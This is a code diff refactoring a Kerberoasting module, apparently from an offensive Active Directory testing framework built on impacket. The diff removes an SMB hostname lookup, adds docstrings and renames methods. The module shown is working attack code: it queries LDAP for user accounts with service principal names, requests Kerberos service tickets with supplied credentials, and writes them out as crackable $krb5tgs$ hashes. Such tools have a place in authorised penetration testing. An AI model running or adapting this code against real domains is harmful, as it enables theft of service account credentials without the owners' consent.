@@ -8,7 +8,6 @@ from impacket.krb5.asn1 import TGS_REP
 from pyasn1.codec.der import decoder
 from rich.console import Console
 
-from handlers.smb_connection import SMBConnectionManager
 from handlers.ldap_connection import LdapHandler
 from handlers.profile.get_data import get_domain, get_username, get_password
 from handlers.profile.helper import get_current_profile_path
@@ -20,13 +19,12 @@ random_uuid = uuid4().hex
 class Kerberoasting:
     name = "kerberoasting"
     desc = "Search for kerberoasting computers and users"
-    module_protocol = ["ldap", "smb"]
+    module_protocol = ["ldap"]
     opsec_safe = True
     multiple_hosts = False
     requires_args = True
     min_args = 1
-    # search_filter = '(&(servicePrincipalName=*)(!(objectCategory=computer)))'
-    search_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(samaccounttype=805306369)))"
+    search_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(samaccounttype=805306369)))" # (&(servicePrincipalName=*)(!(objectCategory=computer)))
     attributes = ["servicePrincipalName", "sAMAccountName"]
     usage_desc = "[yellow]Usage:[/] kerberoasting <dc_ip>"
 
@@ -36,15 +34,6 @@ class Kerberoasting:
 
     def options(self):
         pass
-
-    def get_machine_name(self, dc_ip) -> None:
-        """Get the machine name thorugh an SMBConnection + getServerName()"""
-
-        smb_manager = SMBConnectionManager()
-        smb_connection = smb_manager.get_smb_connection(dc_ip)
-        machine_name = smb_connection.getServerName()
-
-        return machine_name
 
     def get_kerberoastable_users(self, dc_ip) -> None:
         """Get all kerberoastable users through LDAP query"""
@@ -64,6 +53,7 @@ class Kerberoasting:
         return users_sam
 
     def get_dc_dnshostname(self) -> None:
+        """Get dnsHostname attribute from Domain Controller"""
         search_filter = "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
         attributes = "dnsHostname"
 
@@ -85,6 +75,7 @@ class Kerberoasting:
         return dcs_list
 
     def kerberoasting(self, username, password, domain):
+        """Perform Kerberoasting attack"""
         user_name = Principal(
             username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
         )
@@ -108,6 +99,7 @@ class Kerberoasting:
 
     @staticmethod
     def format_entry(etype, username, realm, spn, cipher_octets):
+        """Format TGS output"""
         spn = spn.replace(":", "~")
 
         # des_cbc_md5.value - $krb5tgs$%d$*%s$%s$%s*$%s$%s
@@ -140,6 +132,7 @@ class Kerberoasting:
         return entry_format
 
     def output_tgs(self, tgs, old_session_key, session_key, username, spn, fd=None):
+        """Return TGS output"""
         decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
         enc_part = decoded_tgs["ticket"]["enc-part"]
         etype = enc_part["etype"]
@@ -150,7 +143,8 @@ class Kerberoasting:
 
         return entry
 
-    def save_output_tgs(self, tgs):
+    def save_tgs_output(self, tgs):
+        """Save the TGS output on a text file in the profile folder"""
         path = get_current_profile_path() + "/" + f"{random_uuid}_kerberoasting.txt"
 
         try:
@@ -161,8 +155,8 @@ class Kerberoasting:
             console.print(f"[red]![/] Error when writing TGS output to {path}: {error}")
 
     def on_login(self, con_input):
-
-        console.print(f"- [cyan]Target[/]: {self.get_machine_name(con_input)}", highlight=False)
+        """Main function"""
+        console.print(f"- [cyan]Target[/]: {con_input}", highlight=False)
         kerberoastable_users = self.get_kerberoastable_users(con_input)
 
         if not kerberoastable_users:
@@ -185,9 +179,7 @@ class Kerberoasting:
                 console.print("[red][!][/] Unable to obtain TGT.")
                 return
 
-            spn_principal = Principal(
-                spn, type=constants.PrincipalNameType.NT_MS_PRINCIPAL.value
-            )
+            spn_principal = Principal(spn, type=constants.PrincipalNameType.NT_MS_PRINCIPAL.value)
 
             try:
                 tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
@@ -196,14 +188,9 @@ class Kerberoasting:
 
                 tgs_output = self.output_tgs(tgs, oldSessionKey, sessionKey, user, spn)
                 console.print(f"[yellow]{tgs_output}[/]\n", highlight=False)
-                self.save_output_tgs(tgs_output)
+                self.save_tgs_output(tgs_output)
 
-            except Exception as e:
-                console.print(
-                    f"[red][!][/] Exception during TGS request for {spn}: {str(e)}"
-                )
+            except Exception as error:
+                console.print(f"[red][!][/] Exception during TGS request for {spn}: {error}")
 
-        console.print(
-            f"- [cyan]Output saved in[/]: {get_current_profile_path()}/{random_uuid}_kerberoasting.txt",
-            highlight=False,
-        )
+        console.print(f"- [cyan]Output saved in[/]: {get_current_profile_path()}/{random_uuid}_kerberoasting.txt", highlight=False)
